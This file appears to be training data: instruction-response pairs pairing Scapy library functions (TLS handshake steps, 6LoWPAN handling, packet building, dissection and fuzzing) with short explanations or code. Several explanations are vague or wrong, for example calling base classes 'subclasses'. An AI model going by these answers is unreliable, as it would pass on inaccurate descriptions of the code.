{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef should_add_ClientCertificate(self):\n        hs_msg = [type(m) for m in self.cur_session.handshake_messages_parsed]\n        if TLSCertificateRequest not in hs_msg:\n            return\n        certs = []\n        if self.mycert:\n            certs = [self.mycert]\n        self.add_msg(TLSCertificate(certs=certs))\n        raise self.ADDED_CLIENTCERTIFICATE()", "response": "Check if we should add a client certificate."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef should_add_ClientVerify(self):\n        hs_msg = [type(m) for m in self.cur_session.handshake_messages_parsed]\n        if (TLSCertificateRequest not in hs_msg or\n            self.mycert is None or\n                self.mykey is None):\n            return\n        self.add_msg(TLSCertificateVerify())\n        raise self.ADDED_CERTIFICATEVERIFY()", "response": "This method is used to add a CertificateVerify message to the current session."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef add_ClientData(self):\n        if not self.data_to_send:\n            data = six.moves.input().replace('\\\\r', '\\r').replace('\\\\n', '\\n').encode()  # noqa: E501\n        else:\n            data = self.data_to_send.pop()\n        if data == b\"quit\":\n            return\n        if self.linebreak:\n            data += b\"\\n\"\n        self.add_record()\n        self.add_msg(TLSApplicationData(data=data))\n        raise self.ADDED_CLIENTDATA()", "response": "Add client data to the message buffer."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef dispatch_hook(cls, _pkt=None, *args, **kargs):\n\n        cls = conf.raw_layer\n        if _pkt is not None:\n            ptype = orb(_pkt[0])\n            return globals().get(_param_set_cls.get(ptype), conf.raw_layer)\n\n        return cls", "response": "Dispatches the class to get the right parameter set class."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef source_addr_mode2(pkt):\n    if pkt.sac == 0x0:\n        if pkt.sam == 0x0:\n            return 16\n        elif pkt.sam == 0x1:\n            return 8\n        elif pkt.sam == 0x2:\n            return 2\n        elif pkt.sam == 0x3:\n            return 0\n    else:\n        if pkt.sam == 0x0:\n            return 0\n        elif pkt.sam == 0x1:\n            return 8\n        elif pkt.sam == 0x2:\n            return 2\n        elif pkt.sam == 0x3:\n            return 0", "response": "source_addr_mode2 - Returns the amount of bits that are used by the source address."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef sixlowpan_fragment(packet, datagram_tag=1):\n    if not packet.haslayer(IPv6):\n        raise Exception(\"SixLoWPAN only fragments IPv6 packets !\")\n\n    str_packet = raw(packet[IPv6])\n\n    if len(str_packet) <= MAX_SIZE:\n        return [packet]\n\n    def chunks(l, n):\n        return [l[i:i + n] for i in range(0, len(l), n)]\n\n    new_packet = chunks(str_packet, MAX_SIZE)\n\n    new_packet[0] = LoWPANFragmentationFirst(datagramTag=datagram_tag, datagramSize=len(str_packet)) / new_packet[0]  # noqa: E501\n    i = 1\n    while i < len(new_packet):\n        new_packet[i] = LoWPANFragmentationSubsequent(datagramTag=datagram_tag, datagramSize=len(str_packet), datagramOffset=MAX_SIZE // 8 * i) / new_packet[i]  # noqa: E501\n        i += 1\n\n    return new_packet", "response": "Split a packet into different links to transmit as 6lowpan packets."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nadd an internal value to a string", "response": "def addfield(self, pkt, s, val):\n        \"\"\"Add an internal value  to a string\"\"\"\n        tmp_len = self.length_of(pkt)\n        if tmp_len == 0:\n            return s\n        internal = self.i2m(pkt, val)[-tmp_len:]\n        return s + struct.pack(\"!%ds\" % tmp_len, internal)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd an internal value to a string", "response": "def addfield(self, pkt, s, val):\n        \"\"\"Add an internal value to a string\"\"\"\n        if self.length_of(pkt) == 8:\n            return s + struct.pack(self.fmt[0] + \"B\", val)\n        if self.length_of(pkt) == 16:\n            return s + struct.pack(self.fmt[0] + \"H\", val)\n        if self.length_of(pkt) == 32:\n            return s + struct.pack(self.fmt[0] + \"2H\", val)  # TODO: fix!\n        if self.length_of(pkt) == 48:\n            return s + struct.pack(self.fmt[0] + \"3H\", val)  # TODO: fix!\n        elif self.length_of(pkt) == 64:\n            return s + struct.pack(self.fmt[0] + \"Q\", val)\n        elif self.length_of(pkt) == 128:\n            # TODO: FIX THE PACKING!!\n            return s + struct.pack(self.fmt[0] + \"16s\", raw(val))\n        else:\n            return s"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef post_dissect(self, data):\n\n        # uncompress payload\n        packet = IPv6()\n        packet.version = IPHC_DEFAULT_VERSION\n        packet.tc, packet.fl = self._getTrafficClassAndFlowLabel()\n        if not self.nh:\n            packet.nh = self._nhField\n        # HLIM: Hop Limit\n        if self.hlim == 0:\n            packet.hlim = self._hopLimit\n        elif self.hlim == 0x1:\n            packet.hlim = 1\n        elif self.hlim == 0x2:\n            packet.hlim = 64\n        else:\n            packet.hlim = 255\n        # TODO: Payload length can be inferred from lower layers from either the  # noqa: E501\n        # 6LoWPAN Fragmentation header or the IEEE802.15.4 header\n\n        packet.src = self.decompressSourceAddr(packet)\n        packet.dst = self.decompressDestinyAddr(packet)\n\n        if self.nh == 1:\n            # The Next Header field is compressed and the next header is\n            # encoded using LOWPAN_NHC\n\n            packet.nh = 0x11  # UDP\n            udp = UDP()\n            if self.header_compression and \\\n               self.header_compression & 0x4 == 0x0:\n                udp.chksum = self.udpChecksum\n\n            s, d = nhc_port(self)\n            if s == 16:\n                udp.sport = self.udpSourcePort\n            elif s == 8:\n                udp.sport = 0xF000 + s\n            elif s == 4:\n                udp.sport = 0xF0B0 + s\n            if d == 16:\n                udp.dport = self.udpDestinyPort\n            elif d == 8:\n                udp.dport = 0xF000 + d\n            elif d == 4:\n                udp.dport = 0xF0B0 + d\n\n            packet.payload = udp / data\n            data = raw(packet)\n        # else self.nh == 0 not necessary\n        elif self._nhField & 0xE0 == 0xE0:  # IPv6 Extension Header Decompression  # noqa: E501\n            warning('Unimplemented: IPv6 Extension Header decompression')  # noqa: E501\n            packet.payload = conf.raw_layer(data)\n            data = raw(packet)\n        else:\n            packet.payload = conf.raw_layer(data)\n            data = raw(packet)\n\n        return Packet.post_dissect(self, data)", "response": "This function is called by IPHC to dissect the IPv6 packet. It is called after the packet is decompressed and the payload needs to be decompressed and depending on the arguments."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\npage 6 draft feb 2011", "response": "def _getTrafficClassAndFlowLabel(self):\n        \"\"\"Page 6, draft feb 2011 \"\"\"\n        if self.tf == 0x0:\n            return (self.tc_ecn << 6) + self.tc_dscp, self.flowlabel\n        elif self.tf == 0x1:\n            return (self.tc_ecn << 6), self.flowlabel\n        elif self.tf == 0x2:\n            return (self.tc_ecn << 6) + self.tc_dscp, 0\n        else:\n            return 0, 0"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndepending on the payload content, the frame type we should interpretate", "response": "def dispatch_hook(cls, _pkt=b\"\", *args, **kargs):\n        \"\"\"Depending on the payload content, the frame type we should interpretate\"\"\"  # noqa: E501\n        if _pkt and len(_pkt) >= 1:\n            if orb(_pkt[0]) == 0x41:\n                return LoWPANUncompressedIPv6\n            if orb(_pkt[0]) == 0x42:\n                return LoWPAN_HC1\n            if orb(_pkt[0]) >> 3 == 0x18:\n                return LoWPANFragmentationFirst\n            elif orb(_pkt[0]) >> 3 == 0x1C:\n                return LoWPANFragmentationSubsequent\n            elif orb(_pkt[0]) >> 6 == 0x02:\n                return LoWPANMesh\n            elif orb(_pkt[0]) >> 6 == 0x01:\n                return LoWPAN_IPHC\n        return cls"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_issuer_str(self):\n        name_str = \"\"\n        attrsDict = self.get_issuer()\n        for attrType, attrSymbol in _attrName_mapping:\n            if attrType in attrsDict:\n                name_str += \"/\" + attrSymbol + \"=\"\n                name_str += attrsDict[attrType]\n        for attrType in sorted(attrsDict):\n            if attrType not in _attrName_specials:\n                name_str += \"/\" + attrType + \"=\"\n                name_str += attrsDict[attrType]\n        return name_str", "response": "Returns a one - line string containing every type and value of the user s issuer."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef on_packet_received(self, pkt):\n        if not pkt:\n            return\n        if self.store:\n            self.lst.append(pkt)\n        if self.prn:\n            result = self.prn(pkt)\n            if result is not None:\n                print(result)", "response": "Called by the filter handler when a packet is received."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbinds 2 layers for dissection.", "response": "def bind_bottom_up(lower, upper, __fval=None, **fval):\n    \"\"\"Bind 2 layers for dissection.\n    The upper layer will be chosen for dissection on top of the lower layer, if\n    ALL the passed arguments are validated. If multiple calls are made with the same  # noqa: E501\n    layers, the last one will be used as default.\n\n    ex:\n        >>> bind_bottom_up(Ether, SNAP, type=0x1234)\n        >>> Ether(b'\\xff\\xff\\xff\\xff\\xff\\xff\\xd0P\\x99V\\xdd\\xf9\\x124\\x00\\x00\\x00\\x00\\x00')  # noqa: E501\n        <Ether  dst=ff:ff:ff:ff:ff:ff src=d0:50:99:56:dd:f9 type=0x1234 |<SNAP  OUI=0x0 code=0x0 |>>  # noqa: E501\n    \"\"\"\n    if __fval is not None:\n        fval.update(__fval)\n    lower.payload_guess = lower.payload_guess[:]\n    lower.payload_guess.append((fval, upper))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bind_top_down(lower, upper, __fval=None, **fval):\n    if __fval is not None:\n        fval.update(__fval)\n    upper._overload_fields = upper._overload_fields.copy()\n    upper._overload_fields[lower] = fval", "response": "Bind 2 layers for building."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef bind_layers(lower, upper, __fval=None, **fval):\n    if __fval is not None:\n        fval.update(__fval)\n    bind_top_down(lower, upper, **fval)\n    bind_bottom_up(lower, upper, **fval)", "response": "Bind 2 layers on some specific fields values. It makes the packet being built when the arguments are present."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef split_layers(lower, upper, __fval=None, **fval):\n    if __fval is not None:\n        fval.update(__fval)\n    split_bottom_up(lower, upper, **fval)\n    split_top_down(lower, upper, **fval)", "response": "Split 2 layers previously bound."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfunctioning used to explore the Scapy layers and protocols.", "response": "def explore(layer=None):\n    \"\"\"Function used to discover the Scapy layers and protocols.\n    It helps to see which packets exists in contrib or layer files.\n\n    params:\n     - layer: If specified, the function will explore the layer. If not,\n              the GUI mode will be activated, to browse the available layers\n\n    examples:\n      >>> explore()  # Launches the GUI\n      >>> explore(\"dns\")  # Explore scapy.layers.dns\n      >>> explore(\"http2\")  # Explore scapy.contrib.http2\n      >>> explore(scapy.layers.bluetooth4LE)\n\n    Note: to search a packet by name, use ls(\"name\") rather than explore.\n    \"\"\"\n    if layer is None:  # GUI MODE\n        if not conf.interactive:\n            raise Scapy_Exception(\"explore() GUI-mode cannot be run in \"\n                                  \"interactive mode. Please provide a \"\n                                  \"'layer' parameter !\")\n        # 0 - Imports\n        try:\n            import prompt_toolkit\n        except ImportError:\n            raise ImportError(\"prompt_toolkit is not installed ! \"\n                              \"You may install IPython, which contains it, via\"\n                              \" `pip install ipython`\")\n        if not _version_checker(prompt_toolkit, (2, 0)):\n            raise ImportError(\"prompt_toolkit >= 2.0.0 is required !\")\n        # Only available with prompt_toolkit > 2.0, not released on PyPi yet\n        from prompt_toolkit.shortcuts.dialogs import radiolist_dialog, \\\n            button_dialog\n        from prompt_toolkit.formatted_text import HTML\n        # 1 - Ask for layer or contrib\n        action = button_dialog(\n            title=\"Scapy v%s\" % conf.version,\n            text=HTML(\n                six.text_type(\n                    '<style bg=\"white\" fg=\"red\">Chose the type of packets'\n                    ' you want to explore:</style>'\n                )\n            ),\n            buttons=[\n                (six.text_type(\"Layers\"), \"layers\"),\n                (six.text_type(\"Contribs\"), \"contribs\"),\n                (six.text_type(\"Cancel\"), \"cancel\")\n            ])\n        # 2 - Retrieve list of Packets\n        if action == \"layers\":\n            # Get all loaded layers\n            _radio_values = conf.layers.layers()\n            # Restrict to layers-only (not contribs) + packet.py and asn1*.py\n            _radio_values = [x for x in _radio_values if (\"layers\" in x[0] or\n                                                          \"packet\" in x[0] or\n                                                          \"asn1\" in x[0])]\n        elif action == \"contribs\":\n            # Get all existing contribs\n            from scapy.main import list_contrib\n            _radio_values = list_contrib(ret=True)\n            _radio_values = [(x['name'], x['description'])\n                             for x in _radio_values]\n            # Remove very specific modules\n            _radio_values = [x for x in _radio_values if not (\"can\" in x[0])]\n        else:\n            # Escape/Cancel was pressed\n            return\n        # Python 2 compat\n        if six.PY2:\n            _radio_values = [(six.text_type(x), six.text_type(y))\n                             for x, y in _radio_values]\n        # 3 - Ask for the layer/contrib module to explore\n        result = radiolist_dialog(\n            values=_radio_values,\n            title=\"Scapy v%s\" % conf.version,\n            text=HTML(\n                six.text_type(\n                    '<style bg=\"white\" fg=\"red\">Please select a layer among'\n                    ' the following, to see all packets contained in'\n                    ' it:</style>'\n                )\n            ))\n        if result is None:\n            return  # User pressed \"Cancel\"\n        # 4 - (Contrib only): load contrib\n        if action == \"contribs\":\n            from scapy.main import load_contrib\n            load_contrib(result)\n            result = \"scapy.contrib.\" + result\n    else:  # NON-GUI MODE\n        # We handle layer as a short layer name, full layer name\n        # or the module itself\n        if isinstance(layer, types.ModuleType):\n            layer = layer.__name__\n        if isinstance(layer, str):\n            if layer.startswith(\"scapy.layers.\"):\n                result = layer\n            else:\n                if layer.startswith(\"scapy.contrib.\"):\n                    layer = layer.replace(\"scapy.contrib.\", \"\")\n                from scapy.main import load_contrib\n                load_contrib(layer)\n                result_layer, result_contrib = ((\"scapy.layers.%s\" % layer),\n                                                (\"scapy.contrib.%s\" % layer))\n                if result_layer in conf.layers.ldict:\n                    result = result_layer\n                elif result_contrib in conf.layers.ldict:\n                    result = result_contrib\n                else:\n                    raise Scapy_Exception(\"Unknown scapy module '%s'\" % layer)\n        else:\n            warning(\"Wrong usage ! Check out help(explore)\")\n            return\n\n    # COMMON PART\n    # Get the list of all Packets contained in that module\n    try:\n        all_layers = conf.layers.ldict[result]\n    except KeyError:\n        raise Scapy_Exception(\"Unknown scapy module '%s'\" % layer)\n    # Print\n    print(conf.color_theme.layer_name(\"Packets contained in %s:\" % result))\n    rtlst = [(lay.__name__ or \"\", lay._name or \"\") for lay in all_layers]\n    print(pretty_list(rtlst, [(\"Class\", \"Name\")], borders=True))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nlists available layers or infos on a given Packet or name.", "response": "def ls(obj=None, case_sensitive=False, verbose=False):\n    \"\"\"List  available layers, or infos on a given layer class or name.\n    params:\n     - obj: Packet / packet name to use\n     - case_sensitive: if obj is a string, is it case sensitive?\n     - verbose\n    \"\"\"\n    is_string = isinstance(obj, six.string_types)\n\n    if obj is None or is_string:\n        tip = False\n        if obj is None:\n            tip = True\n            all_layers = sorted(conf.layers, key=lambda x: x.__name__)\n        else:\n            pattern = re.compile(obj, 0 if case_sensitive else re.I)\n            # We first order by accuracy, then length\n            if case_sensitive:\n                sorter = lambda x: (x.__name__.index(obj), len(x.__name__))\n            else:\n                obj = obj.lower()\n                sorter = lambda x: (x.__name__.lower().index(obj),\n                                    len(x.__name__))\n            all_layers = sorted((layer for layer in conf.layers\n                                 if (isinstance(layer.__name__, str) and\n                                     pattern.search(layer.__name__)) or\n                                 (isinstance(layer.name, str) and\n                                     pattern.search(layer.name))),\n                                key=sorter)\n        for layer in all_layers:\n            print(\"%-10s : %s\" % (layer.__name__, layer._name))\n        if tip and conf.interactive:\n            print(\"\\nTIP: You may use explore() to navigate through all \"\n                  \"layers using a clear GUI\")\n    else:\n        is_pkt = isinstance(obj, Packet)\n        if issubtype(obj, Packet) or is_pkt:\n            for f in obj.fields_desc:\n                cur_fld = f\n                attrs = []\n                long_attrs = []\n                while isinstance(cur_fld, (Emph, ConditionalField)):\n                    if isinstance(cur_fld, ConditionalField):\n                        attrs.append(cur_fld.__class__.__name__[:4])\n                    cur_fld = cur_fld.fld\n                if verbose and isinstance(cur_fld, EnumField) \\\n                   and hasattr(cur_fld, \"i2s\"):\n                    if len(cur_fld.i2s) < 50:\n                        long_attrs.extend(\n                            \"%s: %d\" % (strval, numval)\n                            for numval, strval in\n                            sorted(six.iteritems(cur_fld.i2s))\n                        )\n                elif isinstance(cur_fld, MultiEnumField):\n                    fld_depend = cur_fld.depends_on(obj.__class__\n                                                    if is_pkt else obj)\n                    attrs.append(\"Depends on %s\" % fld_depend.name)\n                    if verbose:\n                        cur_i2s = cur_fld.i2s_multi.get(\n                            cur_fld.depends_on(obj if is_pkt else obj()), {}\n                        )\n                        if len(cur_i2s) < 50:\n                            long_attrs.extend(\n                                \"%s: %d\" % (strval, numval)\n                                for numval, strval in\n                                sorted(six.iteritems(cur_i2s))\n                            )\n                elif verbose and isinstance(cur_fld, FlagsField):\n                    names = cur_fld.names\n                    long_attrs.append(\", \".join(names))\n                class_name = \"%s (%s)\" % (\n                    cur_fld.__class__.__name__,\n                    \", \".join(attrs)) if attrs else cur_fld.__class__.__name__\n                if isinstance(cur_fld, BitField):\n                    class_name += \" (%d bit%s)\" % (cur_fld.size,\n                                                   \"s\" if cur_fld.size > 1\n                                                   else \"\")\n                print(\"%-10s : %-35s =\" % (f.name, class_name), end=' ')\n                if is_pkt:\n                    print(\"%-15r\" % (getattr(obj, f.name),), end=' ')\n                print(\"(%r)\" % (f.default,))\n                for attr in long_attrs:\n                    print(\"%-15s%s\" % (\"\", attr))\n            if is_pkt and not isinstance(obj.payload, NoPayload):\n                print(\"--\")\n                ls(obj.payload)\n\n        else:\n            print(\"Not a packet class or name. Type 'ls()' to list packet classes.\")"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fuzz(p, _inplace=0):\n    if not _inplace:\n        p = p.copy()\n    q = p\n    while not isinstance(q, NoPayload):\n        for f in q.fields_desc:\n            if isinstance(f, PacketListField):\n                for r in getattr(q, f.name):\n                    print(\"fuzzing\", repr(r))\n                    fuzz(r, _inplace=1)\n            elif f.default is not None:\n                if not isinstance(f, ConditionalField) or f._evalcond(q):\n                    rnd = f.randval()\n                    if rnd is not None:\n                        q.default_fields[f.name] = rnd\n        q = q.payload\n    return p", "response": "Transform a layer into a fuzzy layer by replacing some default values by random objects"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninitialize each field of the fields_desc dict.", "response": "def init_fields(self):\n        \"\"\"\n        Initialize each fields of the fields_desc dict\n        \"\"\"\n\n        if self.class_dont_cache.get(self.__class__, False):\n            self.do_init_fields(self.fields_desc)\n        else:\n            self.do_init_cached_fields()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef do_init_fields(self, flist):\n        for f in flist:\n            self.default_fields[f.name] = copy.deepcopy(f.default)\n            self.fieldtype[f.name] = f\n            if f.holds_packets:\n                self.packetfields.append(f)", "response": "Initialize each field of the fields_desc dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef do_init_cached_fields(self):\n\n        cls_name = self.__class__\n\n        # Build the fields information\n        if Packet.class_default_fields.get(cls_name, None) is None:\n            self.prepare_cached_fields(self.fields_desc)\n\n        # Use fields information from cache\n        if not Packet.class_default_fields.get(cls_name, None) is None:\n            self.default_fields = Packet.class_default_fields[cls_name]\n            self.fieldtype = Packet.class_fieldtype[cls_name]\n            self.packetfields = Packet.class_packetfields[cls_name]\n\n            # Deepcopy default references\n            for fname in Packet.class_default_fields_ref[cls_name]:\n                value = copy.deepcopy(self.default_fields[fname])\n                setattr(self, fname, value)", "response": "Initialize each fields of the fields_desc dict or use the cached\n            fields information"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef prepare_cached_fields(self, flist):\n\n        cls_name = self.__class__\n\n        # Fields cache initialization\n        if flist:\n            Packet.class_default_fields[cls_name] = dict()\n            Packet.class_default_fields_ref[cls_name] = list()\n            Packet.class_fieldtype[cls_name] = dict()\n            Packet.class_packetfields[cls_name] = list()\n\n        # Fields initialization\n        for f in flist:\n            if isinstance(f, MultipleTypeField):\n                del Packet.class_default_fields[cls_name]\n                del Packet.class_default_fields_ref[cls_name]\n                del Packet.class_fieldtype[cls_name]\n                del Packet.class_packetfields[cls_name]\n                self.class_dont_cache[cls_name] = True\n                self.do_init_fields(self.fields_desc)\n                break\n\n            tmp_copy = copy.deepcopy(f.default)\n            Packet.class_default_fields[cls_name][f.name] = tmp_copy\n            Packet.class_fieldtype[cls_name][f.name] = f\n            if f.holds_packets:\n                Packet.class_packetfields[cls_name].append(f)\n\n            # Remember references\n            if isinstance(f.default, (list, dict, set, RandField, Packet)):\n                Packet.class_default_fields_ref[cls_name].append(f.name)", "response": "Prepare the cached fields of the fields_desc object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncall when a dissection is complete.", "response": "def dissection_done(self, pkt):\n        \"\"\"DEV: will be called after a dissection is completed\"\"\"\n        self.post_dissection(pkt)\n        self.payload.dissection_done(pkt)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a deep copy of the instance.", "response": "def copy(self):\n        \"\"\"Returns a deep copy of the instance.\"\"\"\n        clone = self.__class__()\n        clone.fields = self.copy_fields_dict(self.fields)\n        clone.default_fields = self.copy_fields_dict(self.default_fields)\n        clone.overloaded_fields = self.overloaded_fields.copy()\n        clone.underlayer = self.underlayer\n        clone.explicit = self.explicit\n        clone.raw_packet_cache = self.raw_packet_cache\n        clone.raw_packet_cache_fields = self.copy_fields_dict(\n            self.raw_packet_cache_fields\n        )\n        clone.wirelen = self.wirelen\n        clone.post_transforms = self.post_transforms[:]\n        clone.payload = self.payload.copy()\n        clone.payload.add_underlayer(clone)\n        clone.time = self.time\n        return clone"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _superdir(self):\n        attrs = set()\n        cls = self.__class__\n        if hasattr(cls, '__all_slots__'):\n            attrs.update(cls.__all_slots__)\n        for bcls in cls.__mro__:\n            if hasattr(bcls, '__dict__'):\n                attrs.update(bcls.__dict__)\n        return attrs", "response": "Return a list of slots and methods including those from subclasses."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nclearing the raw packet cache for the field and all its subfields", "response": "def clear_cache(self):\n        \"\"\"Clear the raw packet cache for the field and all its subfields\"\"\"\n        self.raw_packet_cache = None\n        for _, fval in six.iteritems(self.fields):\n            if isinstance(fval, Packet):\n                fval.clear_cache()\n        self.payload.clear_cache()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef self_build(self, field_pos_list=None):\n        if self.raw_packet_cache is not None:\n            for fname, fval in six.iteritems(self.raw_packet_cache_fields):\n                if self.getfieldval(fname) != fval:\n                    self.raw_packet_cache = None\n                    self.raw_packet_cache_fields = None\n                    self.wirelen = None\n                    break\n            if self.raw_packet_cache is not None:\n                return self.raw_packet_cache\n        p = b\"\"\n        for f in self.fields_desc:\n            val = self.getfieldval(f.name)\n            if isinstance(val, RawVal):\n                sval = raw(val)\n                p += sval\n                if field_pos_list is not None:\n                    field_pos_list.append((f.name, sval.encode(\"string_escape\"), len(p), len(sval)))  # noqa: E501\n            else:\n                p = f.addfield(self, p, val)\n        return p", "response": "Create the default layer regarding fields_desc dict\n           "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef do_build(self):\n        if not self.explicit:\n            self = next(iter(self))\n        pkt = self.self_build()\n        for t in self.post_transforms:\n            pkt = t(pkt)\n        pay = self.do_build_payload()\n        if self.raw_packet_cache is None:\n            return self.post_build(pkt, pay)\n        else:\n            return pkt + pay", "response": "Create the default version of the layer and return the payload"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates the current layer and return the string with the payload", "response": "def build(self):\n        \"\"\"\n        Create the current layer\n\n        :return: string of the packet with the payload\n        \"\"\"\n        p = self.do_build()\n        p += self.build_padding()\n        p = self.build_done(p)\n        return p"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef do_dissect_payload(self, s):\n        if s:\n            cls = self.guess_payload_class(s)\n            try:\n                p = cls(s, _internal=1, _underlayer=self)\n            except KeyboardInterrupt:\n                raise\n            except Exception:\n                if conf.debug_dissector:\n                    if issubtype(cls, Packet):\n                        log_runtime.error(\"%s dissector failed\" % cls.__name__)\n                    else:\n                        log_runtime.error(\"%s.guess_payload_class() returned [%s]\" % (self.__class__.__name__, repr(cls)))  # noqa: E501\n                    if cls is not None:\n                        raise\n                p = conf.raw_layer(s, _internal=1, _underlayer=self)\n            self.add_payload(p)", "response": "Perform the dissection of the payload of the layer."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nguessing the next payload class from the layer bonds.", "response": "def guess_payload_class(self, payload):\n        \"\"\"\n        DEV: Guesses the next payload class from layer bonds.\n        Can be overloaded to use a different mechanism.\n\n        :param str payload: the layer's payload\n        :return: the payload class\n        \"\"\"\n        for t in self.aliastypes:\n            for fval, cls in t.payload_guess:\n                if all(hasattr(self, k) and v == self.getfieldval(k)\n                       for k, v in six.iteritems(fval)):\n                    return cls\n        return self.default_payload_class(payload)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove fields values that are the same as default values.", "response": "def hide_defaults(self):\n        \"\"\"Removes fields' values that are the same as default values.\"\"\"\n        # use list(): self.fields is modified in the loop\n        for k, v in list(six.iteritems(self.fields)):\n            v = self.fields[k]\n            if k in self.default_fields:\n                if self.default_fields[k] == v:\n                    del self.fields[k]\n        self.payload.hide_defaults()"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef layers(self):\n        layers = []\n        lyr = self\n        while lyr:\n            layers.append(lyr.__class__)\n            lyr = lyr.payload.getlayer(0, _subclass=True)\n        return layers", "response": "returns a list of layer classes including subclasses in this packet"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef getlayer(self, cls, nb=1, _track=None, _subclass=None, **flt):\n        if _subclass is None:\n            _subclass = self.match_subclass or None\n        if _subclass:\n            match = lambda cls1, cls2: issubclass(cls1, cls2)\n        else:\n            match = lambda cls1, cls2: cls1 == cls2\n        if isinstance(cls, int):\n            nb = cls + 1\n            cls = None\n        if isinstance(cls, str) and \".\" in cls:\n            ccls, fld = cls.split(\".\", 1)\n        else:\n            ccls, fld = cls, None\n        if cls is None or match(self.__class__, cls) \\\n           or ccls in [self.__class__.__name__, self._name]:\n            if all(self.getfieldval(fldname) == fldvalue\n                   for fldname, fldvalue in six.iteritems(flt)):\n                if nb == 1:\n                    if fld is None:\n                        return self\n                    else:\n                        return self.getfieldval(fld)\n                else:\n                    nb -= 1\n        for f in self.packetfields:\n            fvalue_gen = self.getfieldval(f.name)\n            if fvalue_gen is None:\n                continue\n            if not f.islist:\n                fvalue_gen = SetGen(fvalue_gen, _iterpacket=0)\n            for fvalue in fvalue_gen:\n                if isinstance(fvalue, Packet):\n                    track = []\n                    ret = fvalue.getlayer(cls, nb=nb, _track=track,\n                                          _subclass=_subclass, **flt)\n                    if ret is not None:\n                        return ret\n                    nb = track[0]\n        return self.payload.getlayer(cls, nb=nb, _track=_track,\n                                     _subclass=_subclass, **flt)", "response": "Return the nb^th layer that is an instance of cls matching flt\nvalues."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef show(self, dump=False, indent=3, lvl=\"\", label_lvl=\"\"):\n        return self._show_or_dump(dump, indent, lvl, label_lvl)", "response": "Print the value of the key - value layer."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef show2(self, dump=False, indent=3, lvl=\"\", label_lvl=\"\"):\n        return self.__class__(raw(self)).show(dump, indent, lvl, label_lvl)", "response": "Print the packet as a hierarchical view of the packet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef sprintf(self, fmt, relax=1):\n\n        escape = {\"%\": \"%\",\n                  \"(\": \"{\",\n                  \")\": \"}\"}\n\n        # Evaluate conditions\n        while \"{\" in fmt:\n            i = fmt.rindex(\"{\")\n            j = fmt[i + 1:].index(\"}\")\n            cond = fmt[i + 1:i + j + 1]\n            k = cond.find(\":\")\n            if k < 0:\n                raise Scapy_Exception(\"Bad condition in format string: [%s] (read sprintf doc!)\" % cond)  # noqa: E501\n            cond, format_ = cond[:k], cond[k + 1:]\n            res = False\n            if cond[0] == \"!\":\n                res = True\n                cond = cond[1:]\n            if self.haslayer(cond):\n                res = not res\n            if not res:\n                format_ = \"\"\n            fmt = fmt[:i] + format_ + fmt[i + j + 2:]\n\n        # Evaluate directives\n        s = \"\"\n        while \"%\" in fmt:\n            i = fmt.index(\"%\")\n            s += fmt[:i]\n            fmt = fmt[i + 1:]\n            if fmt and fmt[0] in escape:\n                s += escape[fmt[0]]\n                fmt = fmt[1:]\n                continue\n            try:\n                i = fmt.index(\"%\")\n                sfclsfld = fmt[:i]\n                fclsfld = sfclsfld.split(\",\")\n                if len(fclsfld) == 1:\n                    f = \"s\"\n                    clsfld = fclsfld[0]\n                elif len(fclsfld) == 2:\n                    f, clsfld = fclsfld\n                else:\n                    raise Scapy_Exception\n                if \".\" in clsfld:\n                    cls, fld = clsfld.split(\".\")\n                else:\n                    cls = self.__class__.__name__\n                    fld = clsfld\n                num = 1\n                if \":\" in cls:\n                    cls, num = cls.split(\":\")\n                    num = 